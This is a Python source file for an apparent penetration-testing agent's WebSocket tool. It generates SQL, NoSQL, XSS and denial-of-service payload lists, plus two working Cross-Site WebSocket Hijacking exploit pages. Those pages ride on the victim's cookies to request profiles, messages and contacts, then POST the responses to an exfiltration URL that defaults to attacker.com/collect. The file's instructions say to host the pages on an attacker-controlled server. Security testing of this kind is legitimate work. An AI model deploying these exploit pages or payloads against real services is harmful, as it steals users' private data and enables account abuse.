"""WebSocket Client tool for WebSocket security testing."""

from __future__ import annotations

import json
from typing import Any, Literal
from urllib.parse import parse_qs, urlparse

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


WSAction = Literal["connect_info", "generate_payloads", "test_origin", "generate_exploit"]


def _generate_ws_payloads() -> dict[str, list[dict[str, Any]]]:
    """Generate WebSocket testing payloads."""
    return {
        "injection": [
            {"payload": '{"action": "test\\"};alert(1)//"}', "category": "JSON injection"},
            {"payload": "'; DROP TABLE users; --", "category": "SQL injection via WS"},
            {"payload": '{"$where": "sleep(5000)"}', "category": "NoSQL injection via WS"},
            {"payload": "<script>alert(1)</script>", "category": "XSS via WS message"},
            {
                "payload": '{"action": "subscribe", "channel": "admin"}',
                "category": "Channel hijacking",
            },
        ],
        "authorization": [
            {"payload": '{"action": "get_user", "user_id": "other_user"}', "category": "IDOR"},
            {"payload": '{"action": "admin_action"}', "category": "Privilege escalation"},
            {
                "payload": '{"action": "impersonate", "target": "admin"}',
                "category": "Impersonation",
            },
        ],
        "dos": [
            {"payload": "a" * 100000, "category": "Large message"},
            {
                "payload": json.dumps({"nested": {"nested": {"nested": {}}}} * 100),
                "category": "Deep nesting",
            },
        ],
    }


def _generate_cswsh_exploit(target_ws_url: str, exfil_url: str) -> str:
    """Generate Cross-Site WebSocket Hijacking exploit."""
    return f"""<!DOCTYPE html>
<html>
<head>
  <title>CSWSH Exploit</title>
</head>
<body>
<h1>WebSocket Hijacking Test</h1>
<script>
// Target WebSocket URL (should be accessible cross-origin)
const targetWS = '{target_ws_url}';
const exfilURL = '{exfil_url}';

// Establish WebSocket connection
// Victim's cookies will be sent automatically
const ws = new WebSocket(targetWS);

ws.onopen = function() {{
  console.log('Connected to target WebSocket');

  // Send requests as the victim
  ws.send(JSON.stringify({{action: 'get_profile'}}));
  ws.send(JSON.stringify({{action: 'get_messages'}}));
  ws.send(JSON.stringify({{action: 'get_contacts'}}));
}};

ws.onmessage = function(event) {{
  console.log('Received:', event.data);

  // Exfiltrate data
  fetch(exfilURL, {{
    method: 'POST',
    body: JSON.stringify({{
      data: event.data,
      timestamp: new Date().toISOString()
    }}),
    mode: 'no-cors'
  }});
}};

ws.onerror = function(error) {{
  console.error('WebSocket Error:', error);
}};

ws.onclose = function() {{
  console.log('WebSocket closed');
}};

// Keep connection alive
setInterval(function() {{
  if (ws.readyState === WebSocket.OPEN) {{
    ws.send(JSON.stringify({{action: 'ping'}}));
  }}
}}, 30000);
</script>

<p>If you see "Connected to target WebSocket" in the console,
the target is vulnerable to CSWSH.</p>
</body>
</html>"""


def _generate_null_origin_exploit(target_ws_url: str, exfil_url: str) -> str:
    """Generate null origin WebSocket exploit using sandboxed iframe."""
    return f"""<!DOCTYPE html>
<html>
<head>
  <title>Null Origin WS Test</title>
</head>
<body>
<!-- Sandboxed iframe generates null Origin -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
const ws = new WebSocket('{target_ws_url}');
ws.onopen = function() {{
  ws.send(JSON.stringify({{action: 'get_profile'}}));
}};
ws.onmessage = function(e) {{
  parent.postMessage(e.data, '*');
}};
</script>
"></iframe>

<script>
window.addEventListener('message', function(e) {{
  console.log('Received from null origin:', e.data);
  fetch('{exfil_url}', {{
    method: 'POST',
    body: e.data,
    mode: 'no-cors'
  }});
}});
</script>
</body>
</html>"""


def _analyze_ws_url(ws_url: str) -> dict[str, Any]:
    """Analyze WebSocket URL for security testing."""
    parsed = urlparse(ws_url)

    analysis: dict[str, Any] = {
        "url": ws_url,
        "protocol": parsed.scheme,
        "host": parsed.netloc,
        "path": parsed.path,
        "query_params": parse_qs(parsed.query),
        "security_notes": [],
        "test_recommendations": [],
    }

    # Check for secure WebSocket
    if parsed.scheme == "ws":
        analysis["security_notes"].append({
            "severity": "high",
            "note": "Using unencrypted WebSocket (ws://). Should use wss://",
        })

    # Check for tokens in URL
    if parsed.query:
        for param in ["token", "auth", "key", "session", "jwt"]:
            if param in parsed.query.lower():
                analysis["security_notes"].append({
                    "severity": "medium",
                    "note": f"Potential authentication token in URL query ({param})",
                })

    # Test recommendations
    analysis["test_recommendations"] = [
        "Test Cross-Site WebSocket Hijacking (CSWSH) from attacker-controlled origin",
        "Test null origin acceptance via sandboxed iframe",
        "Test message injection in WebSocket messages",
        "Test IDOR via user/channel IDs in messages",
        "Test authentication state changes mid-connection",
        "Check for rate limiting on messages",
    ]

    return analysis


@register_tool
def websocket_client(
    action: WSAction,
    ws_url: str | None = None,
    origin: str | None = None,
    exfil_url: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """WebSocket security testing utilities.

    This tool provides utilities for WebSocket security testing
    including CSWSH exploit generation and payload creation.

    Note: This tool generates test payloads and exploit code.
    Actual WebSocket connections should be made using browser
    DevTools or dedicated WebSocket testing tools.

    Args:
        action: The WebSocket action to perform:
            - connect_info: Analyze WebSocket URL and provide testing guidance
            - generate_payloads: Generate WebSocket testing payloads
            - test_origin: Generate origin testing guidance
            - generate_exploit: Generate CSWSH exploit HTML
        ws_url: WebSocket URL to test (wss:// or ws://)
        origin: Origin to test (for test_origin action)
        exfil_url: URL for data exfiltration (for exploit generation)

    Returns:
        Testing payloads, exploit code, or analysis results
    """
    # Define valid parameters and actions
    VALID_PARAMS = {
        "action",
        "ws_url",
        "origin",
        "exfil_url",
    }
    VALID_ACTIONS = ["connect_info", "generate_payloads", "test_origin", "generate_exploit"]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "websocket_client")
    if unknown_error:
        unknown_error.update(
            generate_usage_hint("websocket_client", "connect_info", {"ws_url": "wss://example.com/ws"})
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "websocket_client")
    if action_error:
        action_error["usage_examples"] = {
            "connect_info": "websocket_client(action='connect_info', ws_url='wss://example.com/ws')",
            "generate_payloads": "websocket_client(action='generate_payloads')",
            "test_origin": "websocket_client(action='test_origin', origin='target.com')",
            "generate_exploit": "websocket_client(action='generate_exploit', ws_url='wss://target.com/ws', exfil_url='https://attacker.com/log')",
        }
        return action_error

    # Validate required parameters based on action
    if action in ["connect_info", "generate_exploit"]:
        param_error = validate_required_param(ws_url, "ws_url", action, "websocket_client")
        if param_error:
            param_error.update(
                generate_usage_hint("websocket_client", action, {"ws_url": "wss://example.com/ws"})
            )
            return param_error

    if action == "generate_exploit":
        param_error = validate_required_param(exfil_url, "exfil_url", action, "websocket_client")
        if param_error:
            param_error.update(
                generate_usage_hint("websocket_client", action, {"ws_url": "wss://target.com/ws", "exfil_url": "https://attacker.com/log"})
            )
            return param_error

    try:
        if action == "connect_info":
            if not ws_url:
                return {"error": "ws_url parameter required for this action"}

            return _analyze_ws_url(ws_url)

        if action == "generate_payloads":
            return {
                "payloads": _generate_ws_payloads(),
                "usage": (
                    "Send these payloads through the WebSocket connection "
                    "to test for vulnerabilities"
                ),
            }

        if action == "test_origin":
            test_origins = [
                {"origin": "https://evil.com", "description": "External attacker origin"},
                {"origin": "null", "description": "Null origin (sandboxed iframe)"},
                {"origin": f"https://sub.{origin or 'target.com'}", "description": "Subdomain"},
            ]

            return {
                "test_origins": test_origins,
                "instructions": (
                    "For each origin, attempt to establish a WebSocket connection "
                    "and check if the server validates the Origin header. "
                    "If connection succeeds from evil.com, the endpoint is vulnerable to CSWSH."
                ),
            }

        if action == "generate_exploit":
            if not ws_url:
                return {"error": "ws_url parameter required for this action"}

            exfil = exfil_url or "https://attacker.com/collect"

            return {
                "cswsh_exploit": _generate_cswsh_exploit(ws_url, exfil),
                "null_origin_exploit": _generate_null_origin_exploit(ws_url, exfil),
                "instructions": (
                    "Host these HTML files on an attacker-controlled server. "
                    "When a victim visits the page, if the WebSocket server "
                    "doesn't validate Origin, data will be exfiltrated."
                ),
            }

        return {"error": f"Unknown action: {action}"}

    except (ValueError, OSError) as e:
        return {"error": f"WebSocket testing failed: {e!s}"}
